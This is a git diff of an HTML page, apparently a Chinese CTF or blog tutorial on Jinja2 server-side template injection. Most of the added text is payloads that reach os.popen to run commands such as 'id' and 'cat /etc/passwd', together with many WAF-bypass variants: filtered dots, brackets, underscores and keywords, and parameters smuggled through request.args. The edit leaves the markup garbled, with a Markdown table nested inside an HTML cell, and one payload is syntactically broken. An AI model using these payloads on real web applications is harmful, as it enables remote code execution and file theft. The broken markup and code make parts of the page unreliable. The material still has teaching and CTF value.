@@ -278,8 +278,6 @@
 <h3 id="类链利用原理"><a href="#类链利用原理" class="headerlink" title="类链利用原理"></a>类链利用原理</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> x= <span class="string">&#x27;abcd&#x27;</span> %&#125;                           <span class="comment"># 声明变量</span></span><br><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125;   <span class="comment"># 循环语句</span></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="number">25</span>==<span class="number">5</span>*<span class="number">5</span> %&#125;&#123;&#123;<span class="number">1</span>&#125;&#125;&#123;% endif %&#125;              <span class="comment"># 条件语句</span></span><br></pre></td></tr></table></figure>
 
 <p><code>__class__</code> 返回类型所属的对象<br><code>__mro__</code> 返回方法解析顺序（MRO）元组，<code>__mro__[1]</code> 一般是 <code>object</code>（Python2 里 <code>str</code> 的 MRO 是 <code>(str, basestring, object)</code>，所以用 <code>[2]</code>）<br><code>__base__</code> 返回该对象直接继承的基类，等价于 <code>__bases__[0]</code><br><code>__subclasses__</code>返回基类中的所有子类，每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><code>__globals__</code> 是函数所在模块的全局变量字典，能从里面翻到 <code>os</code>、<code>__builtins__</code><br><code>get_flashed_messages()</code> 返回在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用<code>get_flashed_messages()</code> 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)<br><code>__builtins__</code> 兜底为什么万能：每个模块的 globals 里 Python 会自动塞一个 <code>__builtins__</code>，里面有 <code>eval</code>、<code>__import__</code>、<code>open</code>、<code>chr</code>，模块没 import os 也能现拿：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;self.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>类链怎么走：<code>__class__</code> → <code>__mro__</code>/<code>__base__</code> → <code>__subclasses__()</code> → <code>__init__.__globals__</code> → <code>os</code> / <code>__builtins__</code></p>
 <h4 id="找到基类中的所有子类"><a href="#找到基类中的所有子类" class="headerlink" title="找到基类中的所有子类"></a>找到基类中的所有子类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()          # &lt;type &#x27;list&#x27;&gt; &lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()        # &lt;type &#x27;str&#x27;&gt; &lt;type &#x27;object&#x27;&gt;</span><br><span class="line">().__class__.__bases__[0].__subclasses__()      # &lt;type &#x27;tuple&#x27;&gt; &lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&#123;&#125;.__class__.__mro__[1].__subclasses__()        # &lt;class &#x27;dict&#x27;&gt; &lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
 <p>找到子类，我们就可以去找子类的一些危险方法</p>
@@ -413,7 +411,7 @@
 <p>写文件用 <code>write</code>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/1&#x27;).write(&quot;&quot;) &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="过滤与绕过"><a href="#过滤与绕过" class="headerlink" title="过滤与绕过"></a>过滤与绕过</h3><h4 id="常见-WAF-与绕过思路"><a href="#常见-WAF-与绕过思路" class="headerlink" title="常见 WAF 与绕过思路"></a>常见 WAF 与绕过思路</h4><table>
+<h3 id="过滤与绕过"><a href="#过滤与绕过" class="headerlink" title="过滤与绕过"></a>过滤与绕过</h3><table>
 <thead>
 <tr>
 <th>被过滤</th>
@@ -429,42 +427,101 @@
 <td><code>lipsum|string|list</code> 取第 24 个字符、<code>chr(95)</code>、<code>\x5f</code></td>
 </tr>
 <tr>
-<td>双大括号</td>
-<td>改用语句标签（见下）</td>
-</tr>
-<tr>
-<td>关键字 <code>class</code>/<code>globals</code></td>
-<td>字符串拼接 <code>&quot;cla&quot;&quot;ss&quot;</code>、<code>~</code>、<code>format</code>、反转、<code>base64</code></td>
-</tr>
-<tr>
-<td>引号</td>
-<td>双引号/反引号、<code>request.args</code> 传参</td>
-</tr>
-<tr>
-<td>数字下标</td>
-<td>用 <code>|attr</code>、<code>|list|first</code>、<code>|string|list</code> 动态取值</td>
+<td><code>&#123;&#123;&#125;&#125;`                 | 换成语句标签 `&#123;% print(...) %&#125;`                                     |
+| 关键字 `class`/`globals` | 字符串拼接 `"cla""ss"`、`~`、`format`、反转、`base64`    |
+| 引号                     | 双引号/反引号、`request.args` 传参                       |
+| 数字下标                 | 用 `\|attr`、`\|list\|first`、`\|string\|list` 动态取值  |
+
+
+#### 关键符号被过滤
+（1）**`.` 被过滤** → 全部换成 `|attr`或者换成`[]`
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;echo HI&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;&quot;[&#x27;__class__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+（2）**`[` `]` 被过滤** → 用 `__getitem__` / `pop` / `get`
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum.__globals__).__getitem__(&quot;os&quot;).popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__|attr(&quot;get&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;echo HI&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum.__globals__).pop(&quot;os&quot;).popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+注意 `pop` 会**真的把键删掉**——它动的是 `jinja2.utils` 模块的全局字典，删了之后同一进程里别人再取 `["os"]` 就取不到了（我本地实测过：pop 完后面所有链子全挂）。所以
+
+* 用 `pop` 的那次必须**放在最后**
+* 或者干脆用 `get` / `__getitem__`，它们不删键
+
+（3）**`&#123;&#123; &#125;&#125;</code> 被过滤** → 换成语句标签 <code>&#123;% print(...) %&#125;</code></td>
+<td></td>
 </tr>
 </tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print([].__class__.__base__.__subclasses__()) %&#125;</span><br><span class="line">&#123;% if 7*7==49 %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(lipsum.__globals__[&quot;os&quot;].popen(&quot;echo HI&quot;).read()) %&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="变量访问：点、中括号、getitem"><a href="#变量访问：点、中括号、getitem" class="headerlink" title="变量访问：点、中括号、getitem"></a>变量访问：点、中括号、getitem</h4><p>Jinja2 除了用点访问属性，还可以用中括号下标（本质是 <code>__getitem__</code>）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[&#x27;__class__&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.__getitem__(&#x27;__builtins__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.pop(&#x27;__builtins__&#x27;)&#125;&#125;          # 会删除键，慎用</span><br><span class="line">&#123;&#123;url_for.__globals__.get(&#x27;__builtins__&#x27;)&#125;&#125;          # 推荐，取不到返回 None</span><br><span class="line">&#123;&#123;url_for.__globals__.setdefault(&#x27;__builtins__&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>（4）**<code>_</code> 被过滤** → 从 <code>lipsum|string</code> 里取第 24 个字符（正好是 <code>_</code>），再用 <code>~</code> 拼</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set u=(lipsum|string|list)|attr(&quot;pop&quot;)(24) %&#125;&#123;&#123;lipsum|attr(u~u~&quot;globals&quot;~u~u)|attr(&quot;get&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;echo HI&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>（5）过滤中括号[]：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 正常：</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__config__.__base__.__subclasses__()[117].__init__.__globals__.[&#x27;popen&#x27;](&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"># 过滤[] 可以使用__getitem__()绕过</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__config__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>属性的获取本质是 <code>__getattribute__</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure>
+<h4 id="字符串构造（绕过关键字过滤）"><a href="#字符串构造（绕过关键字过滤）" class="headerlink" title="字符串构造（绕过关键字过滤）"></a>字符串构造（绕过关键字过滤）</h4><h5 id="引号里的字符串"><a href="#引号里的字符串" class="headerlink" title="引号里的字符串"></a>引号里的字符串</h5><p>（1）**<code>+</code> 拼接**</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;__buil&quot;+&quot;tins__&quot;][&quot;__impor&quot;+&quot;t__&quot;](&quot;o&quot;+&quot;s&quot;).popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="字符串构造（绕过关键字过滤）"><a href="#字符串构造（绕过关键字过滤）" class="headerlink" title="字符串构造（绕过关键字过滤）"></a>字符串构造（绕过关键字过滤）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;cla&quot;+&quot;ss&quot;                       # 拼接</span><br><span class="line">&quot;cla&quot;&quot;ss&quot;                        # jinja2 里相邻字符串字面量自动拼接，等价于 &quot;class&quot;</span><br><span class="line">&quot;__ssalc__&quot;[::-1]                # 反转</span><br><span class="line">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;        # 十六进制转义</span><br><span class="line">(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)           # python2 的 base64</span><br><span class="line">&quot;&#123;0:c&#125;&quot;.format(97)                         # 得到 a</span><br><span class="line">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)   # __class__</span><br><span class="line">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;          # ~ 拼接</span><br><span class="line">&quot;&quot;[&quot;__CLASS__&quot;.lower()]                                # 只过滤小写时可用</span><br></pre></td></tr></table></figure>
+<p>（2）<strong>相邻字面量</strong>（Jinja2 自动拼接）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;__buil&quot;&quot;tins__&quot;][&quot;__impor&quot;&quot;t__&quot;](&quot;o&quot;&quot;s&quot;).popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>用 <code>chr</code> 需要先从 <code>__builtins__</code> 里取：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr %&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;   # %2b 是 + 的 URL 编码</span><br></pre></td></tr></table></figure>
+<p>（3）**<code>~</code> 拼接**（<code>+</code> 被禁时用它）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;__buil&quot;~&quot;tins__&quot;][&quot;__impor&quot;~&quot;t__&quot;](&quot;o&quot;~&quot;s&quot;).popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="过滤器（filter）"><a href="#过滤器（filter）" class="headerlink" title="过滤器（filter）"></a>过滤器（filter）</h4><p><code>|attr</code>：等价于取属性，点号或点号+中括号都被过滤时用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure>
+<p>（4）**<code>join</code>**（也常用 <code>&quot;fla&quot;.join(&quot;/g&quot;)</code> 得到 <code>/flag</code> 这种”分隔符塞中间”的写法）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;&quot;.join([&quot;__buil&quot;,&quot;tins__&quot;])][&quot;&quot;.join([&quot;__impor&quot;,&quot;t__&quot;])](&quot;&quot;.join([&quot;o&quot;,&quot;s&quot;])).popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><code>|format</code>：printf 风格格式化，可以拼字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)      # __class__</span><br></pre></td></tr></table></figure>
+<p>（5）<strong>反转</strong>（<code>[::-1]</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;__snitliub__&quot;[::-1]][&quot;__tropmi__&quot;[::-1]](&quot;so&quot;[::-1]).popen(&quot;IH ohce&quot;[::-1]).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>其它常用过滤器：<code>|join</code>、<code>|lower</code>、<code>|string</code>、<code>|list</code>、<code>|first</code>、<code>|last</code>、<code>|length</code>、<code>|replace</code>、<code>|map</code>、<code>|select</code>、<code>|reduce</code>，被过滤时往往能换一个达到同样效果</p>
+<p>（6）<strong>大小写转换</strong>（只过滤小写时）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;__BUILTINS__&quot;.lower()][&quot;__IMPORT__&quot;.lower()](&quot;OS&quot;.lower()).popen(&quot;ECHO HI&quot;.lower()).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（7）<strong>hex 转义</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&quot;\x5f\x5fimport\x5f\x5f&quot;](&quot;\x6f\x73&quot;).popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（8）**<code>|format</code> 的 <code>%c</code>**</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;%c%c%c%c%c%c%c%c%c%c%c%c&quot;|format(95,95,98,117,105,108,116,105,110,115,95,95)][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（9）**<code>chr</code>**（要先从 <code>__builtins__</code> 里把 <code>chr</code> 取出来）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=lipsum.__globals__[&quot;__builtins__&quot;].chr %&#125;&#123;&#123;lipsum.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](chr(111)~chr(115)).popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（10）**<code>dict|join</code>**（连字母都被过滤时，拿字典的关键字当”字母表”）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[dict(o=a,s=a)|join].popen(&quot;echo HI&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（11）**<code>request.args</code> 传参**（字符串完全不进模板，最省事）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>配套请求：<code>?a=os&amp;b=popen&amp;c=echo HI</code></p>
+<p>（12）<strong>py2 时代的老写法</strong>（现在少见，见到能认出来就行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&quot;/fl&quot;&quot;ag&quot;).read()&#125;&#125;</span><br><span class="line">(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)          # py2 的 base64</span><br></pre></td></tr></table></figure>
+
+<h5 id="引号外的关键字"><a href="#引号外的关键字" class="headerlink" title="引号外的关键字"></a>引号外的关键字</h5><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>例子</th>
+<th>对策</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>属性名 / 方法名</td>
+<td><code>__globals__</code>、<code>__class__</code>、<code>popen</code></td>
+<td>搬进引号（<code>|attr(&quot;…&quot;)</code> 或 <code>[&quot;…&quot;]</code>），再用上面①~⑫的造串法</td>
+</tr>
+<tr>
+<td>变量名 / 入口名</td>
+<td><code>lipsum</code>、<code>config</code>、<code>self</code></td>
+<td>换一个没被过滤的入口，见（5）</td>
+</tr>
+</tbody></table>
+<p><strong>属性名本来就是字符串，搬进引号就能用”引号里”的全部技巧</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(request.args.g)|attr(&quot;get&quot;)(request.args.k)|attr(&quot;popen&quot;)(&quot;echo HI&quot;)|attr(&quot;read&quot;)()&#125;&#125; #配套请求：`?g=__globals__&amp;k=os`</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum|attr(&quot;__glo&quot;~&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;echo HI&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;echo HI&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
 <h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>手工绕不过 WAF 时，用 <a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">fenjing</a> 自动生成能过黑名单的 Jinja2 payload（下面按 0.9.1 实测）。</p>
 <p>安装：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install fenjing</span><br></pre></td></tr></table></figure>
